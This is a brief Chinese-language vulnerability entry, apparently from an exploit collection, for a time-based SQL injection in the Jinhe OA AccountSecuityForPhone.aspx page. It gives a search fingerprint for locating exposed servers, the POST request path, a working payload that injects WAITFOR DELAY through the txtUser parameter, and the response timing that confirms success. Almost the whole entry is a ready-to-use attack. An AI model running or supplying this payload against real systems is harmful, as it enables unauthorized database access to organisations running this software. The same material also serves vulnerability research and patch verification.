# 金和OAAccountSecuityForPhone.aspx存在SQL注入漏洞

金和OA ｜ SQL注入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/Jhsoft.Web.addmenu/AccountSecuityForPhone.aspx/ HTTP/1.1`

**Payload**
```
_ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=YOUR___VIEWSTATE&txtUser=1'WAITFOR+DELAY+'0:0:5'--&btnSearch=%E6%9F%A5%E8%AF%A2&__VIEWSTATEGENERATOR=YOUR___VIEWSTATEGENERATOR&__EVENTTARGET=&__EVENTARGUMENT=
```
- **响应特征**：200 响应时间>=5s